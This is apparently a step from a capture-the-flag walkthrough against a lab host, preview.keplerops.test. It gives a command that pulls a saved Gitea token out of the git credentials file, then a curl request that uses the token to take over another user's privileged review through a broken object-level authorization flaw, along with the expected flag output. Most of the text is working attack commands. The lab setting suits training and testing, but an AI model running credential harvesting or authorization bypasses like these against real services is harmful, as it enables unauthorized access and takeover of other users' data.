## Prerequisite

K10.2 gives `source_id=doc-9bc054d6f95dfa6a` and `DOC-9BC054D6F95DFA6A`.

## Read the developer token

The developer token is your saved Gitea credential.

```
TOKEN=$(sed -E 's#https://[^:]+:([^@]+)@.*#\1#' ~/.config/git/credentials)
```

## Discover the target review

The privileged-review queue holds review PRV-771 for document DOC-9BC054D6F95DFA6A.
The assignment endpoint does not verify that the caller owns the review.

## BOLA assignment

```
curl -sk --cacert ~/.local/share/keplerops/ca.crt -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary '{"queue":"privileged-review","source_id":"doc-9bc054d6f95dfa6a"}' \
  https://preview.keplerops.test/api/preview/reviews/PRV-771/assignment
```

Expected output:

```json
{"document_id":"DOC-9BC054D6F95DFA6A","flag":"FLAG{3073e7ddb80f48ee}","queue":"privileged-review","review_id":"PRV-771","schema":"fieldkest.preview-review-assignment/v1","source_id":"doc-9bc054d6f95dfa6a","state":"loaded"}
```

The service stores an `action_nonce` in the review record. It does not return the
nonce here. K12.2 recovers it through the review session page.
